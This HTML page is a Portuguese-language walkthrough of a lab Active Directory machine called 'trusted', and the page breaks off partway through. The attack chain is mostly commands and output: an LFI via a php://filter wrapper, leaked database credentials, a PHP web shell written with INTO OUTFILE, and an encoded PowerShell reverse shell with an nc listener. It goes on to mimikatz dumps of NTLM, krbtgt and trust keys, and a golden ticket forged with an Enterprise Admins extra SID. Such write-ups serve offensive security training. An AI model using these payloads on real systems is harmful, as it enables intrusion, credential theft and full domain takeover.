<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <title>trust</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- FONT -->
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg: #000000;
            --panel: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.06);
            --text: #cfd6ff;
            --muted: #7d85a6;
            --accent: #5b7cfa;
        }

        body {
            margin: 60px auto;
            width: 75%;
            background: radial-gradient(circle at 20% 10%, #000000, var(--bg));
            color: var(--text);
            font-family: 'IBM Plex Mono', monospace;
            font-size: 14px;
        }

        #h1 {
            font-size: 22px;
            margin-top: 0;
        }

        #asci {
            font-size: 3px;
            line-height: 1;
            /* Mantém o espaçamento vertical correto */
            margin: 0;
        }

        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        b {
            color: red;
        }

        section {
            background: var(--panel);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 24px;
            margin-top: 32px;
        }
    </style>
</head>

<body>
    <main>

        <center>
            <pre id="asci">
       ⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⠀⠀
    ⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀
    ⢀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⡀
    ⠘⡀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⢀⠇
    ⠀⣧⠀⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⣼⠀
    ⠀⢸⣆⠀⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠀⣰⡏⠀
    ⢱⡀⢿⣆⠸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡏⣰⡿⠀⡌
    ⠀⢷⡈⢿⣧⣻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣟⣴⡿⢁⡾⠀
    ⢀⠈⢷⣌⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⡿⣡⡾⠁⡀
    ⠀⠳⡈⢻⣦⡻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣵⡟⢁⠞⠀
    ⠀⠀⠙⢦⡹⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⢏⣴⠋⠀⠀
    ⠀⠀⠀⡈⠻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠟⢁⠀⠀⠀
    ⠀⠀⠀⠈⠢⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⠔⠁⠀⠀⠀
    ⠀⠀⠀⠀⢀⠈⠛⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠛⠁⡀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠉⠒⠦⣬⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣥⠴⠒⠉⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠠⠤⢤⣌⣉⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣉⣡⡤⠤⠄⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣉⣭⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣯⣭⣭⣉⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⢉⣉⣭⣽⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣭⣉⣉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠛⠛⠛⠛⢛⣩⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣭⡛⠛⠛⠛⠛⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠴⠾⠟⠛⣫⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣝⠛⠻⠷⠦⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠟⠛⣫⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣝⠛⠻⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠾⠛⣡⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⢿⣎⠛⠷⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠋⢀⠿⠋⡿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⠙⠿⡄⠙⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⠇⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            </pre>
        </center>
        <section>
            <h2>Recon</h2>
            <p>Temos algo rodando na porta <b>80</b>, se rodarmos um fuzzing podemos ver o <b>/dev</b></p>
            <center><img src="trusted-web.png" alt="trusted" width="80%"></center>
            <p>Se olharmos para o final da pagina temos uma mensagem indicando que há uma DB.</p>
            <p>Se irmos a pagina de About, podemos ver o parâmetro <b>viwe=</b> na url</p>
            <center><img src="view-trsute.png" alt="view" width="70%"></center>

            <p><b>http://10.10.201.214/dev/index.html?view=about.html</b></p>
            <p>Indicando que há uma LFI e se tem LFI possivelmente temos php wrapper <br>
                vamos tentar fazer uma exploração basica <br>
                Podemos confirmar o LFI</p>
            <center><img src="lfi.png" alt="" width="92%"></center>

            <h2>Php wrapper</h2>
            <p>Como vimos que temos uma DB na aplicação podemos procurar pelo o que ta rodando nela ou seja o que está
                rodando é o <b>Xampp</b></p>
            <p>Se procurarmos pela estrutura padrão dela e segui a logica a DB fica em <b>C:\xamp\htdocs\dev\db.php</b>
            </p>
            <p>Podemos então usar esse comando para ler o conteúdo da DB e transforma ele em base64 e depois desencodar
                o conteudo</p>
            <p><b>view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\db.php</b></p>
            <center><img src="db-trusted.png" alt="" width="90%"></center>
            <p>Recebemos ela em base64, basta desencodar e teremos credencias para a DB</p>
            <p>
                <b>&lt;?php
                    $servername = "localhost";<br>
                    $username = "root";<br>
                    $password = "SuperSecureMySQLPassw0rd1337.";<br>
                    <br>
                    $conn = mysqli_connect($servername, $username, $password);<br>
                    <br>
                    if (!$conn) {<br>
                    die("Connection failed: " . mysqli_connect_error());<br>
                    } <br>
                    echo "Connected successfully";<br>
                    ?&gt;</b>
            </p>

            <p>Dentro da DB podemos ver alguns usuários com algumas hashs</p>
            <center><img src="hashs-trsut.png" alt="" width="60%">
            <img src="crede-trsut.png" alt="" width="70%"></center>
            <p>agora precisamos validar essas credenciais.</p>
            <pre>
            <b>┌──(root㉿kali)-[/home/kali/vunlab/trusted]
            └─# nxc smb 10.10.201.214 -u 'rsmith' -p 'IHateEric2' --shares
            SMB         10.10.201.214   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)
            SMB         10.10.201.214   445    LABDC            [+] lab.trusted.vl\rsmith:IHateEric2
            SMB         10.10.201.214   445    LABDC            [*] Enumerated shares
            SMB         10.10.201.214   445    LABDC            Share           Permissions     Remark
            SMB         10.10.201.214   445    LABDC            -----           -----------     ------
            SMB         10.10.201.214   445    LABDC            ADMIN$                          Remote Admin
            SMB         10.10.201.214   445    LABDC            C$                              Default share
            SMB         10.10.201.214   445    LABDC            IPC$            READ            Remote IPC
            SMB         10.10.201.214   445    LABDC            NETLOGON        READ            Logon server share
            SMB         10.10.201.214   445    LABDC            SYSVOL          READ            Logon server share</b>
            </pre>

            <p>Como temos acesso de root na DB podemos simplesmente upar uma shell para o site</p>
            <h3>shell</h3>
            <pre><b><code>SELECT '&lt;html&gt;&lt;body&gt;&lt;form method="GET" name="&lt;?php echo basename($_SERVER[\'PHP_SELF\']); ?&gt;"&gt;&lt;input type="TEXT" name="cmd" id="cmd" size="80"&gt;&lt;input type="SUBMIT" value="Execute"&gt;&lt;/form&gt;&lt;pre&gt;&lt;?php if(isset($_GET[\'cmd\'])) { system($_GET[\'cmd\']); } ?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;script&gt;document.getElementById("cmd").focus();&lt;/script&gt;&lt;/html&gt;' INTO OUTFILE 'C:\\xampp\\htdocs\\dev\\shell1.php';</code></b></pre>
            <center><img src="shell.png" alt="" width="90%"></center>

            <p>E então</p>
            <p><b>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY... <br>
                    rlwrap nc -lnvp 1337</b>
            </p>

            <p>Temos shell</p>
            <center><img src="shell2.png" alt="" width="50%"></center>
            <p>Primerio vamos verificar o host e enviar o mimikatz para a maquina</p>
            <center><img src="mimi1.png" alt="" width="50%"></center>
            <p>Vamos rodar ele</p>
            <p><b> .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" exit</b>
            </p>
            <p>Output</p>
            <pre>
            SAMKey : 2d01f5cd0a8c4fa19e8b1cf1f21cd76e
            RID  : 000001f4 (500)
            User : Administrator
            Hash NTLM: 86a9ee70dfd64d20992283dc5721b475
            
            Authentication Id : 0 ; 6807961 (00000000:0067e199)
            Session           : Batch from 0
            User Name         : cpowers
            Domain            : LAB
            Logon Server      : LABDC
            Logon Time        : 11/28/2025 12:25:01 AM
            SID               : S-1-5-21-2241985869-2159962460-1278545866-1107
            msv :	
            [00000003] Primary
            * Username : cpowers
            * Domain   : LAB
            * NTLM     : 322db798a55f85f09b3d61b976a13c43
            * SHA1     : e845d39122d58246ff7e28a282e8ed0e19ede373
            * DPAPI    : 01644e36ac919f8de1101ff9fde5a7fb
            tspkg :	
            wdigest :	
            * Username : cpowers
            * Domain   : LAB
            * Password : (null)
            kerberos :	
            * Username : cpowers
            * Domain   : LAB.TRUSTED.VL
            * Password : (null)
            ssp :	
            credman :	
            cloudap :	
            </pre>

            <h3>Movimento lateral</h3>
            <p>Agora podemos rodar o bloodhound</p>
            <pre><b>bloodhound-python -u cpowers --hashes :322db798a55f85f09b3d61b976a13c43 -d lab.trusted.vl -c All -ns 10.10.201.214</b></pre>
            <center><img src="domains.png" alt="" width="40%"></center>
            <p>Interessante</p>
            <h2>Golden Ticket</h2>
            <p>Vamos usar o mimikatz para pegar NTLM do krbtgt</p>
            <pre>
<b>PS C:\Tools> .\mimikatz.exe "privilege::debug" "lsadump::lsa /user:krbtgt /patch" "exit"</b>

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /user:krbtgt /patch
Domain : LAB / S-1-5-21-2241985869-2159962460-1278545866

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : c7a03c565c68c6fac5f8913fab576ebd

mimikatz(commandline) # exit
Bye!
            </pre>
            <p>Agora vamos pegar mais algumas informações do dominio</p>

            <pre>
<b>PS C:\ProgramData> .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::trust /patch" exit</b>

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

560	{0;000003e7} 1 D 21492     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 908528    	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,28p)	       Primary
 * Thread Token  : {0;000003e7} 1 D 939848    	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	       Impersonation (Delegation)

mimikatz(commandline) # lsadump::trust /patch

Current domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866)

Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591)
 [  In ] LAB.TRUSTED.VL -> TRUSTED.VL
    * 5/27/2023 4:19:25 PM - CLEAR   - ea 31 66 22 35 93 0e ef 05 dd e5 94 f0 70 b5 dd 2c de b4 ec 7a 47 73 ae 20 45 15 00 9c 0c 1a 7e 9a f4 68 c7 22 c9 d2 35 cb 67 bb 8d 56 7e 5b 9f 4e 9c b4 4c 77 a6 b7 41 2e d9 3d e4 87 73 5b ee 44 8b 4f 3f f3 e8 ac 32 21 08 db 79 9a 55 2b a0 6f c2 dd 69 c6 9a b7 4d e1 8a 4c f6 e8 0b 47 a9 cb cf 4d 6f 14 8c 28 44 66 63 85 20 13 3b c8 93 bd 20 38 ff 6c 73 d3 2a 61 a3 10 fc 2f d5 af 29 a8 5b 28 09 0d 1f 17 46 8d 7d 09 fa e8 55 61 2e d7 6b 3a 70 38 11 e0 42 08 4b 5b 2b be 53 2c 62 97 64 42 4e 11 fb 50 ed 2f ef 58 38 be 20 a4 4b f6 cf a7 45 18 73 56 be cd 6c 0a 78 16 f7 51 ae 82 59 95 7a 33 f0 27 a6 6d 08 62 ca 74 5f 82 13 c2 d2 aa 7b 12 96 b8 16 27 2e ee 48 bd e4 21 41 db a2 e2 92 ca f3 5d d6 76 cc b5 66 28 2a 87 92
	* aes256_hmac       a7880265164670ddfc041c250bdf7d8166bf8ca0c06d86c3ddec12620fdfb800
	* aes128_hmac       9d59311c51bd3eb6cc846cf1af53c80f
	* rc4_hmac_nt       fdb9239325aed982da5f521116ffbcaf

 [ Out ] TRUSTED.VL -> LAB.TRUSTED.VL
    * 5/27/2023 4:16:17 PM - CLEAR   - 7a 6f b9 f0 49 87 53 be 90 63 63 9c d9 8e 15 f5 ce b5 60 98 6d e6 08 0f 7b ab 3a 7b e3 59 48 a4 f4 6e 6f 1a cc 87 f2 19 81 9a 3b e5 f6 b0 59 28 ad 97 e2 fd fb 39 f8 15 98 ca 4e a9 c4 04 60 15 6a ca 97 0e 20 81 77 42 ac c0 c9 0d 4f 49 4d 64 ee 2a 0f ed aa 4c f3 5b fb 51 ef 50 1a 84 5d 15 a8 9c ce a5 37 a7 02 47 ff 67 0d 1a 59 1c f6 c9 11 9f a2 55 7f c0 45 db 29 77 db 54 9e 46 23 ea 60 a3 9d 9c 11 61 44 51 d2 3f 32 cc e3 67 95 1c a5 0a 0f c6 96 3d e2 a3 53 2b 92 41 a2 a2 46 9e 27 65 c4 84 b0 6f 6e 4e 95 70 0e ed a6 a9 8e 1b ac 66 e8 40 61 9f 6e 70 44 6e b1 fc dd a7 72 9d 3e bd ac b7 0e b9 6b 3c a6 b5 a0 d2 9b 74 91 39 02 f8 7c 31 16 09 7c 52 f3 e9 00 3e 0c 88 46 a3 05 c6 5c 2b f9 3c 0c 21 bd b2 04 8b bc 8a b0 74
	* aes256_hmac       bfc64ba951d28743ef247deb0fa7d69197b9fda301c64ae0765ba9c5c6418183
	* aes128_hmac       0fe86c75c4b6686fcae0bd01d0a1fa2c
	* rc4_hmac_nt       cddbd971c2e3e4ef64b4eb024e4e75c0

 [ In-1] LAB.TRUSTED.VL -> TRUSTED.VL
    * 9/14/2022 6:42:24 PM - CLEAR   - f1 f8 8a 0d a9 78 ac d5 2b 9e 58 e2 af 11 fd 31 55 51 91 f2 a0 cf cc 73 9c 12 44 15 f7 23 38 c9 91 d5 79 6e df 70 c2 25 ba 0f 28 43 15 41 b5 c8 25 82 a1 bc 7e f8 7d d1 2b 35 b2 1e d6 80 51 9d e8 94 f8 23 02 79 c4 47 79 c2 43 e1 bf bc e7 ea 41 1c 5d ba 07 0e 28 74 1a 90 c6 be a3 23 72 d1 9e 71 d4 cc d2 1f 8a ba db 10 4c e1 a8 5f 2d c4 6e 76 17 42 22 dd 64 5d a1 7c 9b 06 8e 7a 4e 90 ad ca 5f 30 37 47 20 cb 5e 37 67 aa 91 bc 4c 8d 2b 8e e4 70 d4 93 08 5f 1c b5 56 e3 68 5e 6e 06 4c 50 9a c1 95 ad 2b e6 91 10 d6 83 e2 d4 f7 ee e7 3a e5 7e 83 b0 5d 63 8c d7 46 20 44 16 4c 52 f7 1b f7 bd d4 c6 23 a9 cd 26 6e 01 eb d0 a6 86 cd 79 07 81 a0 33 c9 ba b2 a9 55 e4 c8 61 9c a9 f9 c2 39 d3 66 2c 89 2d 27 a8 27 02 2a 19 fc 66 6f ae 80 5a 7a c6 cf 15 0a dc 64 c2 1b 31 48 0a
	* aes256_hmac       2831e6efcf9c68f7ac4cca33bc3d02ea6e2e25732c59eee4fb9cfd9191a012ab
	* aes128_hmac       98d390a7c5e0b060a76ab09fa0ea8a2c
	* rc4_hmac_nt       246fd721a50615943d32c762161b795a

 [Out-1] TRUSTED.VL -> LAB.TRUSTED.VL
    * 5/27/2023 4:16:17 PM - CLEAR   - ce 13 c1 db 6b b3 cd ad 23 e6 eb 4f a3 65 70 f1 a7 59 24 e9 4b e9 99 71 9a e7 36 dc 8c 36 c3 c4 72 6c ea f8 53 c1 2e 90 84 fd f5 6c eb bf ad a4 84 8c 26 d4 33 be e8 5c f7 78 46 9e dc 55 7f 83 7b 30 22 cd cb 75 33 8c 8c 2d 03 b4 8a 73 52 df 81 d2 23 c7 7d 98 55 fa 1e e6 fc 30 87 82 2e f4 67 dd 06 35 99 7d 26 bc 14 ed 0e f9 57 92 be f2 7b 83 84 cb c4 6d b5 40 60 99 73 ed 5f c3 db 6e d9 d0 28 9c e1 86 1e 4e 97 eb d4 a7 ff aa 79 91 7a bf aa 0c 99 aa 75 59 b5 54 fa 44 6a ce 17 14 8b 04 42 ef 7a a7 b9 bf 48 b6 e3 ee 27 13 aa f0 ab 93 7e 55 ec f4 aa ae c5 4f fd 49 c4 ad 39 28 b2 ab 38 5e 11 6f 0b ed df db 49 fb fb cf 7a 24 d4 36 23 9f cf ca ee 8f 45 2a f4 5a ea 44 14 db 6f 56 f0 1c 36 59 65 2b 01 de 66 d9 15 6d 6c 3d
	* aes256_hmac       1beeae30c9542cfa4f2e6d0be670f04a8618151bddf16aef6880254c4d0848c8
	* aes128_hmac       573a2563cd73893919611594a41a702a
	* rc4_hmac_nt       1b47b29b76348fc043dc69682d0037a4


mimikatz(commandline) # exit
Bye!
            </pre>
            <p>Com os dados necessários, é gerado golden ticket para o <b>Enterprise Admins</b> grupo com <b>ID 519</b>:
            </p>
            <pre><b>└─# python3 ticketer.py -nthash c7a03c565c68c6fac5f8913fab576ebd -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator</b></pre>

            <pre>
┌──(root㉿kali)-[/home/kali/ferramentas/impacket/examples]
└─# <b>export KRB5CCNAME=Administrator.ccache</b>

┌──(root㉿kali)-[/home/kali/ferramentas/impacket/examples]
└─# <b>klist</b>
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@LAB.TRUSTED.VL

Valid starting       Expires              Service principal
11/28/2025 14:20:04  11/26/2035 14:20:04  krbtgt/LAB.TRUSTED.VL@LAB.TRUSTED.VL
	renew until 11/26/2035 14:20:04
            </pre>
            <p>
                o <b>/etc/hosts</b> deve ficar dessa maneira
            </p>
            <pre>
10.10.173.229	TRUSTEDDC.trusted.vl trusted.vl
